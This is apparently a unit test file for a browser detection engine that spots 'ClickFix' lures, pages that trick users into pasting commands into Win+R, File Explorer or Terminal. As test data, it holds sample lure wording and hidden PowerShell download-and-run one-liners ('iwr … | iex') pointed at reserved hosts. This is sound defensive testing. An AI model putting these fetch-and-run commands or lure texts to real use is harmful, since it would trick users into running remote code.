// Unit tests for the detection engine. Run with: npm test
// All "malicious" samples point at reserved, non-routable names and addresses
// (example.invalid, *.example, 203.0.113.0/24) so nothing here can download anything.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { createDetector, defang } = require('../engine/detector.js');
const rules = require('../rules/clickfix-rules.json');
const d = createDetector(rules);

const LURE_PAGE = `Verify you are human. Complete these verification steps:
1. Press Windows Button + R
2. Press CTRL + V
3. Press Enter`;

const TUTORIAL_PAGE = 'To open the Registry Editor, press Windows + R, type regedit and press Enter.';

// Shared with the PowerShell checker tests, so both engines must agree.
const fixtures = require('./fixtures/commands.json');
const MALICIOUS = fixtures.block;
const BENIGN_ALLOW = fixtures.allow;
const BENIGN_WARN = fixtures.warn;

for (const [name, cmd] of Object.entries(MALICIOUS)) {
  test(`blocks: ${name}`, () => {
    const r = d.check(cmd, '');
    assert.equal(r.verdict, 'block', `expected block, got ${r.verdict}; reasons=${JSON.stringify(r.reasons)}`);
    assert.ok(r.reasons.length > 0, 'a block must explain itself');
  });
}

for (const [name, cmd] of Object.entries(BENIGN_ALLOW)) {
  test(`allows: ${name}`, () => {
    const r = d.check(cmd, '');
    assert.equal(r.verdict, 'allow', `expected allow, got ${r.verdict}; reasons=${JSON.stringify(r.reasons)}`);
  });
}

for (const [name, cmd] of Object.entries(BENIGN_WARN)) {
  test(`only warns (no block) on developer installer: ${name}`, () => {
    const r = d.check(cmd, '');
    assert.equal(r.verdict, 'warn');
  });
}

test('any command is blocked when the page says "Win+R, paste"', () => {
  assert.equal(d.check('irm https://get.scoop.sh | iex', LURE_PAGE).verdict, 'block');
  assert.equal(d.check('cmd /c echo hello', LURE_PAGE).verdict, 'block');
});

test('normal text is never blocked, even on a lure page', () => {
  assert.equal(d.check('Hello, here is my email address', LURE_PAGE).verdict, 'allow');
});

test('page analysis: lure vs tutorial', () => {
  const lure = d.analyzePage(LURE_PAGE);
  assert.ok(lure.weak && lure.strong, 'lure page should be strong');
  const tut = d.analyzePage(TUTORIAL_PAGE);
  assert.ok(!tut.weak, 'a Win+R tutorial without "paste" is not a lure');
});

test('page analysis: FileFix and Mac Terminal lures', () => {
  const filefix = d.analyzePage('To open the shared HR file: copy the path, open File Explorer, click the address bar and paste it (Ctrl + V). Verification required.');
  assert.ok(filefix.strong);
  const mac = d.analyzePage('Human verification: press Cmd + Space, open Terminal, then press Cmd + V and Return.');
  assert.ok(mac.strong);
});

test('page analysis: other Win+R spellings', () => {
  for (const t of ['Press Win+R', 'hold the Windows key and press R', 'Press \u229e + R', 'press Windows Key + "R"']) {
    assert.ok(d.analyzePage(t + ' then press Ctrl+V').weak, t);
  }
});

test('long multi-line scripts are downgraded from block to warn', () => {
  const script = Array.from({ length: 10 }, (_, i) => `Write-Host step ${i}`).join('\n') +
    '\npowershell -w hidden -c "iwr https://example.invalid/tool.ps1 | iex"';
  assert.equal(d.check(script, '').verdict, 'warn');
});

test('defang breaks links for display', () => {
  assert.equal(defang('get https://evil.example/x'), 'get hxxps[://]evil.example/x');
});

test('engine resists a page that tampers with RegExp after load', () => {
  const saved = RegExp.prototype.exec;
  try {
    RegExp.prototype.exec = () => null; // a hostile page could do this
    const r = d.check(MALICIOUS['mshta with fake Cloudflare comment'], '');
    assert.equal(r.verdict, 'block');
  } finally {
    RegExp.prototype.exec = saved;
  }
});

test('a download-and-run command copied inside a frame is blocked', () => {
  const plain = 'powershell -c "irm https://example.invalid/x | iex"';
  assert.equal(d.check(plain, '').verdict, 'warn', 'top-level page: only a note');
  const r = d.check(plain, '', { subframe: true });
  assert.equal(r.verdict, 'block');
  assert.match(r.reasons[0], /frame/);
  assert.equal(d.check('npm install react', '', { subframe: true }).verdict, 'allow', 'normal commands stay allowed in frames');
});
